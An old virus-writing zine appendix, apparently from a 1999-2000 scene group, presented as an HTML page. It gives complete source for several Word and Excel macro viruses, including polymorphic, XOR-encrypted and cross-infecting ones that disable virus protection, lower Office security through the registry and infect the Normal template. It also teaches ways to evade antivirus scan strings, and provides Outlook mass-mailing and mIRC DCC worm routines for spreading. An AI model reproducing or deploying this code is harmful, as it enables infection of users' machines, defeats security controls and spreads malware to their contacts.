@@ -1,0 +1,586 @@
+<HTML>
+<HEAD>
+   <TITLE>Tutorials - A Phreaky Macro Primer 0.1 - Appendix</TITLE>
+</HEAD>
+<BODY TEXT="#000000" BGCOLOR="#C0C0C0" LINK="#800000" VLINK="#800000" ALINK="#800000" BACKGROUND="tuback01.gif">
+<blockquote>
+  <PRE><b>
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=[LineZer0 Network 99]=-=
+                                                      ?    ?    ?        
+                                                        ?  ____  
+                                                          /    \ ?
+      A phreaky macro primer v0.1                     ?  / \ _  \  ?
+      .by jackie / Metaphase                            ( .o o.  ) ___
+                                                      __/   ^    \/   \
+                                                     /  \___o____      \
+=-=[ Appendix ]=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-</b>
+
+     .Several good source codes
+     .How to optimize your macro
+     .Worm routines for macro
+     .Office 2000 optimation
+                                
+   [ Music ]
+
+     .Life of Agony .1989/1999
+     .Sepultura .Chaos AD
+
+<b>
+.Several good source codes</b>
+
+    In this section I will show you some good examples for macro viruses.
+
+Infect Target written by Lys Kovick
+An example of appending code to existing subs.
+
+---[ code starts here ]----------------------------------------------------
+
+Private Sub Document_Open(): IT
+End Sub
+Private Function IT()
+Options.ConfirmConversions = 0
+Options.SaveNormalPrompt = 0
+Options.VirusProtection = 0
+If ThisDocument = NormalTemplate Then Set Target = ActiveDocument Else Set Target = 
+NormalTemplate
+Set TargetModule = Target.VBProject.VBComponents.Item(1).CodeModule
+If TargetModule.CountOfLines = 0 Then TargetModule.AddFromString "Private Sub 
+Document_Open()" & vbCrLf & "End Sub"
+If TargetModule.CountOfLines &gt; 0 Then
+For X = 1 To TargetModule.CountOfLines
+If TargetModule.Lines(X, 1) = "Private Function IT()" Then GoTo Quit
+Next
+End If
+Set Host = ThisDocument.VBProject.VBComponents.Item(1).CodeModule
+For X = 1 To Host.CountOfLines
+If Host.Lines(X, 1) = "Private Function IT()" Then GoTo Continue
+Next
+Continue:
+TD = Host.Lines(X, 26)
+For X = 1 To TargetModule.CountOfLines
+If Left(TargetModule.Lines(X, 1), 4) = "Sub " Then TargetModule.ReplaceLine X, 
+TargetModule.Lines(X, 1) & ": IT"
+If Left(TargetModule.Lines(X, 1), 12) = "Private Sub " Then TargetModule.ReplaceLine X, 
+TargetModule.Lines(X, 1) & ": IT"
+Next
+TargetModule.AddFromString TD
+If Target = ActiveDocument Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
+Quit:
+End Function
+
+---[ code ends here ]------------------------------------------------------
+
+
+Obsolete written by jackie
+An example of advanced polymorphism
+
+---[ code starts here ]----------------------------------------------------
+
+Private Sub Obsolete()
+On Error Resume Next: Dim NCode(30) As String: GoTo Marker23
+Marker03: OurSize = OurSelf.CountOfLines - cThree: GoTo Marker04
+Marker04: i = i + cOne: GoTo Marker05
+Marker05: c1 = cZero: c2 = cZero: c3 = Int(Rnd * (OurSize - i) + cOne): GoTo Marker06
+Marker06: If NCode(c2 + cOne) = "" Then GoTo Marker07 Else GoTo Marker08
+Marker07: c1 = c1 + cOne: GoTo Marker08
+Marker08: c2 = c2 + cOne: GoTo Marker09
+Marker09: If c1 &lt; c3 Then GoTo Marker06 Else GoTo Marker10
+Marker10: NCode(c2) = OurSelf.Lines((OurSize + cThree) - i, cOne): GoTo Marker11
+Marker11: If i = OurSize Then GoTo Marker12 Else GoTo Marker04
+Marker12: For y = cOne To OurSize: OurCode = OurCode & NCode(y) & vbCr: Next: GoTo 
+Marker17
+Marker13: If MacroContainer = ActiveDocument Then Set OurHost = NormalTemplate Else Set 
+OurHost = ActiveDocument: GoTo Marker14
+Marker14: Set OurVictim = OurHost.VBProject.VBComponents(cOne).CodeModule: GoTo Marker15
+Marker15: Set OurSelf = ThisDocument.VBProject.VBComponents(cOne).CodeModule: GoTo 
+Marker16
+Marker16: If Len(OurSelf.Lines(cOne, OurSelf.CountOfLines)) &lt;&gt; Len(OurVictim.Lines(cOne, 
+OurVictim.CountOfLines)) Then GoTo Marker03 Else GoTo Marker24
+Marker17: OurVictim.DeleteLines cOne, OurVictim.CountOfLines: GoTo Marker18
+Marker18: OurVictim.InsertLines cOne, OurSelf.Lines(cOne, cTwo) & vbCr & OurCode: GoTo 
+Marker19
+Marker19: OurVictim.DeleteLines OurVictim.CountOfLines, cOne: GoTo Marker20
+Marker20: OurVictim.InsertLines OurVictim.CountOfLines + cOne, 
+OurSelf.Lines(OurSelf.CountOfLines, cOne): GoTo Marker21
+Marker21: If OurHost = ActiveDocument Then ActiveDocument.SaveAs ActiveDocument.FullName: 
+GoTo Marker24
+Marker22: With Application: .Options.VirusProtection = cZero: .Options.SaveNormalPrompt = 
+cZero: .DisplayStatusBar = cZero: .EnableCancelKey = cZero: .DisplayAlerts = cZero: End 
+With: GoTo Marker13
+Marker23: cZero = Asc(Chr(65)) - Asc(Chr(65)): cOne = Asc(Chr(66)) - Asc(Chr(65)): cTwo = 
+Asc(Chr(67)) - Asc(Chr(65)): cThree = Asc(Chr(68)) - Asc(Chr(65)): cTrigger = 
+Asc(Chr(96)) - Asc(Chr(65)): GoTo Marker22
+Marker24: If Day(Now()) = cTrigger Then GoTo Marker25 Else GoTo Marker26
+Marker25: MsgBox Application.UserName & " is obsolete.", cZero, "Class.Obsolete": GoTo 
+Marker26
+Marker26: Exit Sub
+End Sub 'Written by an old friend...
+
+---[ code ends here ]------------------------------------------------------
+
+
+Element written by jackie
+An example of basic encryption
+
+---[ code starts here ]----------------------------------------------------
+
+Private Sub Document_Open()
+On Error Resume Next
+For y = 7 To 25: ThisDocument.VBProject.VBComponents(1).CodeModule.ReplaceLine y, 
+c(Mid(ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(y, 1), 2), 
+Val(Mid(ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(33, 1), 2))): Next
+Element
+End Sub
+Private Sub Element()
+'On Error Resume Next
+'SetAttr NormalTemplate.FullName, vbNormal
+'k = 210 + Int(Rnd * 45)
+'ThisDocument.VBProject.VBComponents(1).CodeModule.ReplaceLine 33, Chr(39) & k
+'For y = 7 To 25
+'ThisDocument.VBProject.VBComponents(1).CodeModule.ReplaceLine y, Chr(39) & 
+c(ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(y, 1), k)
+'Next
+'Application.Options.VirusProtection = False
+'Application.Options.SaveNormalPrompt = False
+'Application.DisplayAlerts = wdAlertsNone
+'Application.DisplayStatusBar = False
+'If ThisDocument = ActiveDocument Then Set host = NormalTemplate Else Set host = 
+ActiveDocument
+'If host.VBProject.VBComponents(1).CodeModule.Lines(27, 1) &lt;&gt; "Private Function c(w, k)" 
+Then
+'host.VBProject.VBComponents(1).CodeModule.deletelines 1, 
+host.VBProject.VBComponents(1).CodeModule.countoflines
+'host.VBProject.VBComponents(1).CodeModule.insertlines 1, 
+ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1, 34)
+'If host = ActiveDocument Then ActiveDocument.SaveAs ActiveDocument.FullName
+'End If
+'ThisDocument.Save
+'If Minute(Now()) = Second(Now()) Then MsgBox "...you, keep away from me, keep away from 
+their ingenuity!", 0, "Class.Element"
+End Sub
+Private Function c(w, k)
+For y = 1 To Len(w)
+c = c & Chr(Asc(Mid(w, y, 1)) Xor k)
+Next
+End Function
+'Class.Element by an old friend...
+'0
+
+---[ code ends here ]------------------------------------------------------
+
+
+Sweetest Thing written by jackie
+An example of advanced encrypted cross infection
+
+---[ code starts here ]----------------------------------------------------
+
+Private Function c(s, k)
+For l = 1 To Len(s): c = c & Chr(Asc(Mid(s, l, 1)) Xor k): Next
+End Function
+Private Sub Document_Open()
+For b = 1 To 136: If Mid(ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(b, 1), 
+1, 1) = Chr(39) Then ThisDocument.VBProject.VBComponents(1).CodeModule.ReplaceLine b, 
+c(Mid(ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(b, 1), 2), 
+Val(Mid(ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(140, 1), 2))) & Chr(39)
+Next: w
+End Sub
+Private Sub Document_Close(): Document_Open: End Sub
+Private Sub Workbook_Open()
+For b = 1 To 136: If 
+Mid(ThisWorkbook.VBProject.VBComponents("DieseArbeitsmappe").CodeModule.Lines(b, 1), 1, 
+1) = Chr(39) Then 
+ThisWorkbook.VBProject.VBComponents("DieseArbeitsmappe").CodeModule.ReplaceLine b, 
+c(Mid(ThisWorkbook.VBProject.VBComponents("DieseArbeitsmappe").CodeModule.Lines(b, 1), 
+2), 
+Val(Mid(ThisWorkbook.VBProject.VBComponents("DieseArbeitsmappe").CodeModule.Lines(140, 
+1), 2))) & Chr(39)
+Next: e
+End Sub
+Private Sub Workbook_BeforeClose(Cancel As Boolean): Workbook_Open: End Sub
+Private Sub w()
+On Error Resume Next: st: bss '
+Randomize: Set o = ThisDocument.VBProject.VBComponents(1).CodeModule '
+o.ReplaceLine 140, Chr(39) & (211 + Int(Rnd * 39)) '
+For l = 1 To 136 '
+If Right(o.Lines(l, 1), 1) = Chr(39) Then o.ReplaceLine l, Left(Chr(39) & c(o.Lines(l, 
+1), Val(Mid(o.Lines(140, 1), 2))), Len(o.Lines(l, 1)) - 1) '
+Next '
+If ThisDocument = ActiveDocument Then Set h = NormalTemplate Else Set h = ActiveDocument 
+'
+With h.VBProject.VBComponents(1).CodeModule '
+If .Lines(1, 1) &lt;&gt; "Private Function c(s, k)" Then '
+.deletelines 1, .countoflines '
+.InsertLines 1, o.Lines(1, 141) '
+If h = ActiveDocument And ActiveDocument.Path &lt;&gt; "" Then ActiveDocument.SaveAs 
+FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument '
+End If '
+End With '
+ThisDocument.Save '
+Set x = GetObject(, "excel.application") '
+If x = "" Then Set x = CreateObject("excel.application"): q = True '
+If UCase(Dir(x.Application.StartupPath & "\Mappe.")) &lt;&gt; "MAPPE" Then '
+Set b = x.Workbooks.Add '
+b.VBProject.VBComponents("DieseArbeitsmappe").CodeModule.InsertLines 1, o.Lines(1, 141) '
+j = "Cause it's a bitter sweet symphony that's life" '
+b.SaveAs x.Application.StartupPath & "\Mappe.": b.Close '
+End If '
+If q = True Then x.Quit '
+End Sub
+Private Sub e()
+On Error Resume Next: st: bst '
+Randomize: Set o = ThisWorkbook.VBProject.VBComponents("DieseArbeitsmappe").CodeModule '
+o.ReplaceLine 140, Chr(39) & (211 + Int(Rnd * 39)) '
+For l = 1 To 136 '
+If Right(o.Lines(l, 1), 1) = Chr(39) Then o.ReplaceLine l, Left(Chr(39) & c(o.Lines(l, 
+1), Val(Mid(o.Lines(140, 1), 2))), Len(o.Lines(l, 1)) - 1) '
+Next '
+If UCase(Dir(Application.StartupPath & "\Mappe.")) &lt;&gt; "MAPPE" Then Workbooks.Add.SaveAs 
+Application.StartupPath & "\Mappe." '
+For Each t In Workbooks '
+If t.VBProject.VBComponents("DieseArbeitsmappe").CodeModule.Lines(1, 1) &lt;&gt; "Private 
+Function c(s, k)" Then '
+t.VBProject.VBComponents("DieseArbeitsmappe").CodeModule.deletelines 1, 
+t.VBProject.VBComponents("DieseArbeitsmappe").CodeModule.countoflines '
+t.VBProject.VBComponents("DieseArbeitsmappe").CodeModule.InsertLines 1, 
+ThisWorkbook.VBProject.VBComponents("DieseArbeitsmappe").CodeModule.Lines(1, 141) '
+If t.Path &lt;&gt; "" Then t.Save Else t.SaveAs t.FullName '
+End If '
+Next '
+ThisWorkbook.Save '
+Set x = GetObject(, "word.application") '
+If x = "" Then Set x = CreateObject("word.application"): q = True '
+If x.NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(1, 1) &lt;&gt; "Private Function 
+c(s, k)" Then '
+x.NormalTemplate.VBProject.VBComponents(1).CodeModule.deletelines 1, 
+x.NormalTemplate.VBProject.VBComponents(1).CodeModule.countoflines '
+x.NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines 1, 
+ThisWorkbook.VBProject.VBComponents("DieseArbeitsmappe").CodeModule.Lines(1, 141) '
+j = "I need to hear some sounds that recognize the pain in me yeah" '
+x.Options.SaveNormalPrompt = (Rnd * 0): x.NormalTemplate.Save '
+End If '
+If q = True Then x.Quit '
+End Sub
+Private Sub st()
+On Error Resume Next '
+Application.StatusBar = False: Application.EnableCancelKey = (Rnd * 0) '
+If Application.Name = "Microsoft Word" Then '
+Application.Options.SaveNormalPrompt = (Rnd * 0) '
+Application.Options.ConfirmConversions = (Rnd * 0) '
+Application.Options.SendMailAttach = vbWhite '
+System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office", 
+"CodeBackColors") = "1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1" '
+System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office", 
+"CodeForeColors") = "1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1" '
+System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office", 
+"EndProcLine") = &H0 '
+If Application.Version = "9.0" Then '
+Application.CommandBars("Macro").Controls(3).Enabled = (Rnd * 0) '
+System.PrivateProfileString("", 
+"HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = &H1 '
+System.PrivateProfileString("", 
+"HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Excel\Security", "Level") = &H1 '
+Else '
+Options.VirusProtection = (Rnd * 0): 
+Application.CommandBars("Tools").Controls(12).Enabled = (Rnd * 0) '
+System.PrivateProfileString("", 
+"HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = 
+&H0 '
+End If '
+End If '
+If Application.Name = "Microsoft Excel" Then '
+If Application.Version = "9.0" Then Application.CommandBars("Macro").Controls(3).Enabled 
+= (Rnd * 0) Else Application.CommandBars("Tools").Controls(11).Enabled = (Rnd * 0) '
+Open "c:\sweet.reg" For Output As #23 '
+Print #23, "REGEDIT4" '
+Print #23, "" '
+Print #23, "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel]" '
+Print #23, """Options6""=dword:00000000" '
+Print #23, "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Excel\Security]" '
+Print #23, """Level""=dword:00000001" '
+Print #23, "[HKEY_CURRENT_USER\Software\Microsoft\VBA\Office]" '
+Print #23, """CodeForeColors""=""1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1""" '
+Print #23, """CodeBackColors""=""1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1""" '
+Print #23, """EndProcLine""=dword:00000000" '
+Close #23 '
+Shell "regedit /s c:\sweet.reg", vbHide '
+End If '
+j = "I let the melody shine, let it climb my mind, I feel free now..." '
+End Sub
+Private Sub bss()
+On Error Resume Next '
+If Minute(Now()) &lt; 23 And Second(Now()) &gt; 23 Then MsgBox "I see the sun begin to rise" & 
+vbCr & "And I'm wounded" & vbCr & "I've seen the world with painted eyes" & vbCr & "That 
+I'm crying through" & vbCr & "I watch the darkness hit the tides" & vbCrLf & "And confide 
+in..." & vbCr & vbCr & "Hold on...", vbInformation, "Cross.SweetestThing" '
+If Day(Now()) = 25 And Month(Now()) = 4 Then MsgBox "1, 2, 3... heXbabe and jackie got 
+together", vbInformation, "Cross.SweetestThing" '
+If Minute(Now()) = Second(Now()) And Minute(Now()) &gt; 55 Then MsgBox "'Cause it's a bitter 
+sweet symphony, that's life...", vbInformation, "Cross.SweetestThing" '
+If Minute(Now()) = Second(Now()) Then '
+MsgBox "Ouuuooh, the sweetest thing...", vbInformation, "Cross.SweetestThing" '
+Application.ScreenUpdating = (Rnd * 0): Documents.Add '
+Selection.Font.Name = "Tahoma": Selection.Font.Size = 14 '
+Selection.TypeText "I'll dream your arms around me" & vbCrLf & "your heartbeat next to 
+mine" & vbCrLf & "a dream of love to guide me" & vbCrLf & "I will dream your hand in 
+mine" & vbCrLf & "once again." & vbCrLf & " " & vbCrLf & "I dream to hear you calling" & 
+vbCrLf & "I dream to touch your heart" & vbCrLf & "I dream of love to follow" & vbCrLf & 
+"I dream your lips on mine" & vbCrLf & "once again." & vbCrLf & " " & vbCrLf '
+Selection.TypeText "'Cause I love you darling!" & vbCrLf & "I'll dream your arms around 
+me" & vbCrLf & "your heartbeat next to mine" & vbCrLf & "once again!" & vbCrLf & " " & 
+vbCrLf & "All your dreams collide" & vbCrLf & "All your nightmares cold and stranded" & 
+vbCrLf & "Let love decide" & vbCrLf & "Let love take the day" & vbCrLf & "the right way!" 
+'
+ActiveDocument.PrintOut Copies:=23: ActiveDocument.Close savechanges:=wdDoNotSaveChanges 
+'
+j = "{Cross.SweetestThing (c) 2000 jackie" '
+End If '
+End Sub
+Private Sub bst()
+On Error Resume Next '
+If Minute(Now()) &lt; 23 And Second(Now()) &gt; 23 Then MsgBox "I see the sun begin to rise" & 
+vbCr & "And I'm wounded" & vbCr & "I've seen the world with painted eyes" & vbCr & "That 
+I'm crying through" & vbCr & "I watch the darkness hit the tides" & vbCrLf & "And confide 
+in..." & vbCr & vbCr & "Hold on...", vbInformation, "Cross.SweetestThing" '
+If Day(Now()) = 25 And Month(Now()) = 4 Then MsgBox "1, 2, 3... heXbabe and jackie got 
+together", vbInformation, "Cross.SweetestThing" '
+If Minute(Now()) = Second(Now()) Then MsgBox "'Cause it's a bitter sweet symphony, that's 
+life...", vbInformation, "Cross.SweetestThing" '
+If Day(Now()) = 31 And Second(Now()) &lt; 55 Then '
+MsgBox "Ouuuooh, the sweetest thing...", vbInformation, "Cross.SweetestThing" '
+Application.EnableCancelKey = (Rnd * 0) '
+Range("A1").FormulaR1C1 = "I'll dream your arms around me": Range("A2").FormulaR1C1 = 
+"your heartbeat next to mine": Range("A3").FormulaR1C1 = "a dream of love to guide me": 
+Range("A4").FormulaR1C1 = "I will dream your hand in mine": Range("A5").FormulaR1C1 = 
+"once again." '
+Application.StatusBar = "Cross.SweetestThing" '
+For i = 1 To 20000: Range((Chr(65 + Int(Rnd * 15)) & (Int(Rnd * 70) + 
+1))).Interior.ColorIndex = (Rnd * 55) + 1: Next '
+Application.StatusBar = False '
+End If '
+j = "Cause it's a bitter sweet symphony that's life" '
+j = "I need to hear some sounds that recognize the pain in me yeah" '
+j = "I let the melody shine, let it climb my mind, I feel free now..." '
+
+j = "{Cross.SweetestThing (c) 2000 jackie" '
+End Sub
+'{Cross.SweetestThing}
+'{Written by a coder in love...}
+
+'215
+
+---[ code ends here ]------------------------------------------------------
+
+<b>
+.How to optimize your macro</b>
+
+    Here we have an more or  less important topic about coding macros, some
+say it is the heaven to optimize everything,  some do not care about. In my
+opinion, it is important to optimize your code as good as possible. In this
+chapter we gonna  talk a bit about  heuristics etc.  First of  all you must
+face it that there are ' scanstrings ' in your macro which make it easy for
+an AV-scanner to detect your macro. For example, if you have a command like
+this in your macro
+
+ .The 'bad' scan strings and how to avoid them
+
+    Allright, have you ever heard of scan strings? Well they are used by AV
+scanners.  Lot's of viruses get detected  because they have too much obious
+evidences of being a virus inside the code. Scan strings can be your simple
+marker to check infections or  just the fact that you use commands like the
+ones I show you below.
+
+ Options.Virusprotection = False
+
+    Well, as you may see, this are very common commands that are nearly can
+be found in every macro. So what can we do now to avoid that this important
+commands works as a scan string? The answer is very simple, what if we just
+try to replace the 'False' with something different like which has the same
+value like for example '(Rnd * 0)'?  All Visual Basic constants will do our
+job for example you can also use 'vbBlack', 'vbEmpty', 'vbHide', 'vbNormal'
+or any other constant that has the value zero.
+
+    Another thing is  that you set the object ' Options ' into a new object
+which looks for example like this.
+
+ Set OurObject = Options
+ OurObject.VirusProtection = False
+
+    Or you can just be so smart and write something uncommon like this.
+
+ Application.Options.VirusProtection = False
+
+    Or whatever comes  to your mind to  fool around  with the heuristic and
+scan strings of an AV software.  As you see,  you have just to do something
+that the AV scanner doesn't thinks that a virus does.  Sounds easy, doesn't
+it? Well there are a look of things you can do, I will show you here a few.
+For testing this I used my favourite  macro scanner with the best heuristic
+in my eyes, this one is called F/Win32, which really does an excellant job!
+I would like to greet Stephan Kurtzhals for this wonderful product, F/Win32
+roqs! So in case of F/Win32, the scanner does not does not cry that a macro
+is turning off the build - in virus protection of Word.  Another one I dis-
+covered is,  that if you declare or set your  variables or object in a div-
+erent way, not like this one here.
+
+ Set Norm = NormalTemplate.VBProject.VBComponents(1).CodeModule
+
+    As you may see,  this one looks very specific for a bad bad virus :) So
+we can try and of course should,  set this object a bit different than most
+of the macros do. Then it could look like this.
+
+    Set ObjA = Normaltemplate: Set ObjB = ObjA.VBProject
+    Set ObjC = ObjB.VBComponents(1): Set Norm = ObjC.CodeModule
+
+    Ok, here we just use a bit strange method to define variables. Just not
+the common way to fake AV with this ;) Well, the best way is encryption.
+
+
+<b>.Worm routines for macro</b>
+
+    A nice trick to help your virus to spread widely,  is to use worm rout-
+ines to help your  bug spread around the net. A good example for using worm
+routines or maybe the best example is Melissa =]. I will show you here some
+very basic ideas (remember ideas,  I don't wanna see ya in prison) how your
+worm could spread  through the cyberspace.  First off all you could use the
+nice email client provided by Microsoft,  Outlook. It is very simple to use
+it for your viral intentions. First off all you have to check if Outlook is
+available on the  infected machine. For example you can  use something like
+this. Btw, this code was taken from the mail script used by Angela/Irok.
+
+ Set y01 = CreateObject("outlook.application")
+ If y01 &lt;&gt; "" Then
+
+  [...Outlook code here...]
+
+ End If
+
+    After that we have to access the MAPI. Easy by using this command.
+
+ Set y02 = y01.GetNameSpace("MAPI")
+
+    Next we make a for-next loop to access the address books of MS Outlook.
+Then we create an object for the current access list,  after that we create
+a new mail.
+
+ For y03 = 1 To y02.AddressLists.Count
+  Set y04 = y02.AddressLists(y03)
+  Set y06 = y01.CreateItem(0)
+
+    Next we create a for-next loop to get all addresses in the current add-
+ress book.  We add one after one every address to the current mail.  If the
+the number of recipients is actually 20 we exit the loop.
+
+ For y07 = 1 To y04.AddressEntries.Count
+  y06.Recipients.Add y04.AddressEntries(y07)
+  If y07 &gt; 20 Then Exit For
+ Next
+
+    After all we edit the mail a bit, first the subject then the message of
+the mail.  We add our virus as attachment  and set the option  that Outlook
+deletes the message after submit.  After all we send the mail and jump back
+to the next address book.
+
+  y06.Subject = "You have GOT new mail!"
+  y06.Body = "Here I have some usefull stuff for you..."
+  y06.Attachments.Add "C:\YourFileHere.EXT"
+  y06.DeleteAfterSubmit = True
+  y06.Send
+
+ Next
+
+    As you see, it's very easy to let your virus be a worm that uses e-mail
+to get around the world. X-D And, as I told ya before, please use this with
+great care, I am NOT responsible for your actions, if you take this and let
+it out in the wild, it's your fault not mine, I just wrote this for educat-
+ion only.
+
+
+    You might know one of  the best things on the net,  IRC, the place were
+we meet ;)  There are some applications  with that you can access IRC,  and
+those apps have scripts,  we can modify  this scripts  to send our virus to
+other IRC users.  The most popular IRC client is definetly mIRC,  short for
+macro Internet Relay Chat.  The default installation  directory for mIRC is
+'c:\mirc'. So first off all we check if mIRC is installed in this directory
+by using this command.
+
+ If UCase(Dir("c:\mirc\mirc32.exe")) &lt;&gt; "MIRC32.EXE" Then
+
+ [...mIRC worm code here...]
+
+ End If
+
+    Now we gonna look at a basic  worm code that you can use in your macro.
+
+ ;Basic Worm Script by jackie
+ on 1:JOIN:#:{ if ( $nick != $me ) { .dcc send $nick c:\somefile.ext } }
+ on 1:TEXT:*worm*:*:{ .msg $nick Sorry I am busy! | .ignore $nick }
+ on 1:TEXT:*dcc*:*:{ .msg $nick Sorry I am busy! | .ignore $nick }
+
+    As I said, this is  very basic and unoptimized.  It sends a file to the
+one who joins  a channel the infected  user is  in and ignores  the one who
+says  something about worm or dcc.  Now we gonna  write this code  into the
+script.ini.
+
+
+ Open "c:\mirc\script.ini" For Output As #1
+ Print #1, "[script]"
+ Print #1, "n0=; Basic Worm Script by jackie"
+ Print #1, "n1=on 1:JOIN:#:{ if ( $nick != $me ) " & _
+           "{ .dcc send $nick c:\somefile.ext } }"
+ Print #1, "n2=on 1:TEXT:*worm*:*:{ .msg $nick Sorry I am busy! " & _
+           "| .ignore $nick }"
+ Print #1. "n3=on 1:TEXT:*dcc*:*:{ .msg $nick Sorry I am busy! " & _
+           "| .ignore $nick }"
+ Close #1
+
+
+    You see,  it's very easy to  use such routines.  If you wanna know more
+about scripting for mIRC, pIRCH, etc just read the help files. They are the
+best reference you can get. Or ask my friend Simon. :D Hi Simon!
+
+<b>
+.Office2000 optimation </b>           
+
+    In Office 2000 macros are phucked,  because there are three damn levels
+of macro security, but as always for MS products, we can infect it. You can
+disable the virus protection of Word 2000, Excel 2000 etc just by using the
+registry, the command that we used in Word 97 isn't anymore. In Word we can
+use this line to disable it.
+
+ System.PrivateProfileString("", _
+  "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", _
+  "Level") = &H1 
+
+    For Excel, etc we can use the following lines of code.
+
+ Open "c:\excel.reg" For Output As #23 
+  Print #23, "REGEDIT4" 
+  Print #23, "" 
+  Print #23, "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Excel\" & _
+             "Security]" 
+  Print #23, """Level""=dword:00000001" 
+ Close #23
+ Shell "regedit /s c:\excel.reg", vbHide
+
+    This works for all other Office  2000 apps too, just get the regkey for
+it. I am too lazy right now to get it for you. Aaaah...and of course we can
+disable the menus in Office 2000. Here's an example for Word 2000.
+
+ Application.CommandBars("Macro").Controls(3).Enabled = False
+
+    Well, that's all I wanna say about Office 2000 optimation,  just get it
+for yourself. ;)
+
+    Heh, that's it. The final end is reached. ;)  No more stuff to read for
+you. Hope you liked this phreaky phuckin  macro primer and learned a bit of
+it.
+
+Catch y'all around,
+jackie
+
+                             -End Of This Shit-
+<b>
+=-=[EOF]=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=[LineZer0 Network 99]=-=</b>
+</PRE>
+</blockquote>
+</BODY>
+</HTML>
